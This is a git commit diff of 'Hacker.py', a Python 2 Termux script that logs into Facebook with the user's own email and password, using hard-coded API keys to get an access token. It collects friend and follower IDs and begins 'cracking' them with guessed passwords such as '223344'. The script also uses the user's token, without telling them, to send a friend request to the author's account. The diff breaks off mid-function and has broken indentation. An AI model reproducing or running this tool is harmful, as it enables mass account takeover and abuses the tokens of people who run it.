d323d7cb3c9d4da9a74cdb1e1ddfbd2f03b3d9c6
PY-14 <88144261+GUPTA-SHAKEL@users.noreply.github.com>
2021-08-11 01:25:01 +0100

    Update Hacker.py
    git clone https://github.com/GUPTA-SHAKEL/Hacker.git
    ls
    cd Hacker
    ls
    python2 Hacker.py

--- Hacker.py
+++ Hacker.py
@@ -104,80 +104,62 @@ while (loop == 'true'):
         print "Wrong Username"
         os.system('xdg-open https://www.Facebook.com/Omi6t')
 
-def main():
-
-    os.system("clear")
-
-    print logo
-
-    print("")
-
-    print("\033[0;97m[ Starting Main Menu ]").center(50)
-
-    print("")
-
-    print("\033[1;97m[1]\033[1;91m > \033[1;97mClone Public ID With b-api")
-
-    print("")
-
-    print("\033[1;97m[2]\033[1;91m > \033[1;97mMore Termux Command")
-
-    print("")
-
-    print("\033[1;97m[0]\033[1;91m > \033[1;97mlogout tool")
-
-    print("")
-
-    main_select()
-
-def main_select():
-
-    Abdullah = raw_input("\033[1;97m[!] Select --->\033[1;96m ")
-
-    if Abdullah  =="1":
-
-        login()
-
-    if Abdullah =="2":
-
-        os.system("xdg-open https://www.facebook.com/profile.php?id=100046218699200")
-
-	main()  
-
-    elif Abdullah =="0":
-
-        os.system("exit")
-
-    else:
-
-        print("[!] Please select a valid option").center(50)
-
-        time.sleep(2)
-
-        main()
-
 def login():
-
-    os.system("clear")
-
-    print logo
-
-    print("")
-
-    print("\033[0;97m[ Login Main Menu ]").center(50)
-
-    print("")
-
-    print("\033[1;97m[1]\033[1;91m > \033[1;97mlogin using token")
-
-    print("")
-
-    print("\033[1;97m[2]\033[1;91m > \033[1;97mlogin using password")
-
-    print("")
-
-    print("\033[1;97m[3]\033[1;91m > \033[1;97mMain menu back")
-
+	os.system('clear')
+	try:
+		toket = open('login.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('clear')
+		print logo
+		print 42*"\033[1;96m="
+		print('\033[1;96m[☆] \x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m[☆]' )
+                print("\033[1;97m[1]\033[1;91m > \033[1;97mlogin using token")
+		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
+		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
+		tik()
+		try:
+			br.open('https://m.facebook.com')
+		except mechanize.URLError:
+			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
+			keluar()
+		br._factory.is_html = True
+		br.select_form(nr=0)
+		br.form['email'] = id
+		br.form['pass'] = pwd
+		br.submit()
+		url = br.geturl()
+		if 'save-device' in url:
+			try:
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				unikers = open("login.txt", 'w')
+				unikers.write(z['access_token'])
+				unikers.close()
+				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
+				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				menu()
+			except requests.exceptions.ConnectionError:
+				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
+				keluar()
+		if 'checkpoint' in url:
+			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			keluar()
+		else:
+			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email is wrong")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			login()
     print("")
 
     login_select()
@@ -241,329 +223,144 @@ def login_select():
 
             login()
 
-    elif Abdullah =="2":
-
-        login_fb()
-
-    elif Abdullah =="3":
-
-        main()
-
-    else:
-
-        print("")
-
-        print("Select a valid option").center(50)
-
-        print("")
-
-        login_select()
-
-def login_fb():
-
-	os.system("clear")
-
-	print logo
-
-	print("")
-
-	print("[ login with password ]").center(50)
-
-	print("")
-
-        id = raw_input("[!] \033[1;93m Email/ID/Number :\033[1;97m ")
-
-        id1 = id.replace(' ','')
-
-        id2 = id1.replace('(','')
-
-        uid = id2.replace(')','')
-
-        pwd = raw_input("[!] \033[1;93m Passwor :\033[1;97m ")
-
-        print("")
-
-        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-
-        q = json.loads(data)
-
-        if "access_token" in q:
-
-            login_s = open(".login.txt","w")
-
-            login_s.write(q["access_token"])
-
-            login_s.close()
-
-            print("\t\033[1;92mLogin Successfull\033[0;97m")
-
-            time.sleep(1)
-
-            menu()
-
-        else:
-
-            if "www.facebook.com" in q["error_msg"]:
-
-                print ("\n\033[1;91m[!] Login Failed . Account Has a Checkpoint\033[0;97m")
-
-                time.sleep(1)
-
-                login_fb()
-
-            else:
-
-                print("\n\033[1;91m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
-
-                time.sleep(1)
-
-                login_fb()		
-
-
-
 def menu():
-
-    global token
-
-    os.system("clear")
-
-    print logo
-
-    try:
-
-        token = open(".fb_token.txt","r").read()
-
-    except (KeyError , IOError):
-
-        login()
-
-    try:
-
-        r = requests.get("https://graph.facebook.com/me?access_token="+token)
-
-        q = json.loads(r.text)
-
-        nm = q["name"]
-
-        nmf = nm.rsplit(" ")[0]
-
-        ok = nmf
-
-    except (KeyError , IOError):
-
-        print("")
-
-        print("login account has checkpoint").center(50)
-
-        print("")
-
-        os.system("rm -rf .fb_token.txt")
-
-        time.sleep(1)
-
-        login()
-
-    except requests.exceptions.ConnectionError:
-
-        print logo
-
-        print("")
-
-        print("Your internet connection failed").center(50)
-
-        print("")
-
-        time.sleep(2)
-
-        menu()
-
-    os.system("clear")
-
-    print logo
-
-    print("")
-
-    print("\t\033[1;92mHello : " +nm)
-
-    print("")
-
-    print("\033[1;97m[1]\033[1;91m > \033[1;97mCrack From Friendlist")
-
-    print("")
-
-    print("\033[1;97m[2]\033[1;91m > \033[1;97mCrack From Public id")
-
-    print("")
-
-    print("\033[1;97m[3]\033[1;91m > \033[1;97mCrack From Followers id")
-
-    print("")
-
-    print("\033[1;97m[0]\033[1;91m > \033[1;97mlogout")
-
-    print("")
-
-    menu_select()
-
-def menu_select():
-
-	select = raw_input("\033[1;93mOption : ")
-
-	id=[]
-
-	oks=[]
-
-	cps=[]
-
-	if select=="1":
-
-		os.system("clear")
-
-		print logo
-
-		print("")
-
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
-
-		z = json.loads(r.text)
-
-		for s in z["data"]:
-
-			uid=s['id']
-
-			na=s['name']
-
-			nm=na.rsplit(" ")[0]
-
-			id.append(uid+'|'+nm)
-
-	if select =="2":
-
-		os.system("clear")
-
-		print(logo)
-
-		print("")
-
-		idt = raw_input("\033[1;97m[!] Put ID/Username :\033[1;96m ")
-
-		os.system("clear")
-
-		print logo
-
-		try:
-
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
-
-			q = json.loads(r.text)
-
-			print("[!] Target from : "+q["name"])
-
-		except (KeyError , IOError):
-
-		    print("")
-
-		    print("\033[1;91your login account has checkpoint").center(50)
-
-		    print("")
-
-		    menu()
-
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
-
-		z = json.loads(r.text)
-
-		for i in z["data"]:
-
-			uid=i['id']
-
-			na=i['name']
-
-			nm=na.rsplit(" ")[0]
-
-			id.append(uid+'|'+nm)
-
-	elif select =="3":
-
-		os.system("clear")
-
-		print logo
-
-		print("")
-
-		idt = raw_input("\033[1;97m[!] Put ID/Username :\033[1;96m ")
-
-		os.system("clear")
-
-		print logo
-
-		try:
-
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-
-			q = json.loads(r.text)
-
-			print(" Target from  : "+q["name"])
-
-		except (KeyError , IOError):
-
-		    print("")
-
-		    print("\033[1;91m login id has checkpoint").center(50)
-
-		    print("")
-
-		    time.sleep(3)
-
-		    menu()
-
-		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
-
-		z = json.loads(r.text)
-
-		for i in z["data"]:
-
-			uid=i['id']
-
-			na=i['name']
-
-			nm=na.rsplit(" ")[0]
-
-			id.append(uid+'|'+nm)
-
-	elif select =="0":
-
-	    os.system("exit")
-
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		os.system('clear')
+		print"\033[1;96m[!] \x1b[1;91mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		id = a['id']
+	except KeyError:
+		os.system('clear')
+		print"\033[1;96m[!] \033[1;91mIt seems that your account has a checkpoint"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;96m[!] \x1b[1;91mThere is no internet connection"
+		keluar()
+	os.system("clear")
+	print logo
+	print 42*"\033[1;96m="
+	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
+	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
+	print 42*"\033[1;96m="
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Hacking"
+	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
+	pilih()
+
+
+def pilih():
+	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
+	if unikers =="":
+		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
+		pilih()
+	elif unikers =="1":
+		super()
+	elif unikers =="0":
+		jalan('Token Removed')
+		os.system('rm -rf login.txt')
+		keluar()
 	else:
+		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
+		pilih()
 
-	    print("")
 
-	    print("Please Select A Valid Option").center(50)
+def super():
+	global toket
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;96m[!] \x1b[1;91mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('clear')
+	print logo
+	print 42*"\033[1;96m="
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
+	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ID"
+	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
+	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
+	pilih_super()
 
-	    time.sleep(2)
-
-	    menu_select()
-
-	print("[!] Total IDs : "+str(len(id)))
-
-	time.sleep(0.5)
-
-	print("[!] Plz wait clone account will be appear here")
-	
-	print 47*("-")
-
-	print('')
-
-	
-
-	def main(arg):
-
-		user=arg
-
-		uid,name=user.split("|")
-
+def pilih_super():
+	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
+	if peak =="":
+		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
+		pilih_super()
+	elif peak =="1":
+		os.system('clear')
+		print logo
+		print 42*"\033[1;96m="
+		jalan('\033[1;96m[👾] \033[1;93mGetting ID \033[1;97m...')
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+	elif peak =="2":
+		os.system('clear')
+		print logo
+		print 42*"\033[1;96m="
+		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID \033[1;91m: \033[1;97m")
 		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
+		except KeyError:
+			print"\033[1;96m[!] \x1b[1;91mID Not Found!"
+			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+			super()
+		jalan('\033[1;96m[👾] \033[1;93mGetting IDs \033[1;97m...')
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif peak =="3":
+		os.system('clear')
+		print logo
+		print 42*"\033[1;96m="
+		try:
+			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
+			for line in open(idlist,'r').readlines():
+				id.append(line.strip())
+		except IOError:
+			print '\x1b[1;96m[!] \x1b[1;91mFile Not Found'
+			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
+			super()
+	elif peak =="0":
+		menu()
+	else:
+		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
+		pilih_super()
+	
+	print "\033[1;96m[+] \033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
+	jalan('\033[1;96m[👾] \033[1;93mStarting \033[1;97m...')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+	print
+	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
+	print 42*"\033[1;96m="
+	
+			
+	def main(arg):
+		global cekpoint,oks
+		user = arg
+		try:
+			os.mkdir('out')
+		except OSError:
+			pass
+          	     try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
 			pass1 = ('223344')
